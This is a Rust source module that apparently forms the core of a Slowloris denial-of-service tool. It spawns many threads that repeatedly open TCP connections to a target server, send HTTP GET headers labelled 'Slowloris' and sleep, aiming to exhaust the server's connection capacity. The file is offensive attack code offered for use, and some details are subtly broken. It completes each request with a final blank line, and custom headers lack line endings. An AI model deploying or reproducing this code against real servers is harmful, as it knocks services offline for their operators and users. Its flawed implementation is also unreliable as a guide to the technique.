pub mod cli;

use std::{
    net::TcpStream,
    io::{
        Write,
        BufWriter,
        Error
    },
    thread,
    time,
    sync::Arc
};

fn build_header(target: &str, custom_headers: Option<&[(&str, &str)]>) -> String {
    let mut headers = String::new();
    headers.push_str("GET / HTTP/1.1\r\n");
    headers.push_str(&format!("Host: {}\r\n", target));
    headers.push_str("Connection: Keep-Alive\r\n");
    headers.push_str("User-Agent: Slowloris\r\n");
    headers.push_str("Accept-Encoding: gzip, deflate\r\n");

    if let Some(custom_headers) = custom_headers {
        for (key, value) in custom_headers {
            headers.push_str(&format!("{}: {}", key, value))
        }
    }

    headers.push_str("\r\n");
    headers
}

pub fn slowloris_connection(target: &str, port: u16, sleep_duration: u64) -> Result<(), Error>{
    let target_addr = format!("{}:{}", target, port);
    loop {
        let stream = TcpStream::connect(target_addr.clone())?;
        let mut writer = BufWriter::new(stream);
        let request = build_header(target, None);
        println!("{}", request);
        writer.write_all(request.as_bytes())?; 
        thread::sleep(time::Duration::from_secs(sleep_duration));
    }
}

pub fn slowloris(target: &str, port: u16, num_connections: u16) {
    let target = Arc::new(target.to_string());
    let mut handles = Vec::new();

    for _ in 0..num_connections {
        let target_clone = Arc::clone(&target);
        let handle = thread::spawn(move || {
            if let Err(e) = slowloris_connection(&target_clone, port, 10) {
                eprintln!("[-] ERROR: Error in connection: {}", e);
            }
        });
        handles.push(handle);
    }
    for handle in handles {
        let _ = handle.join();
    }
}
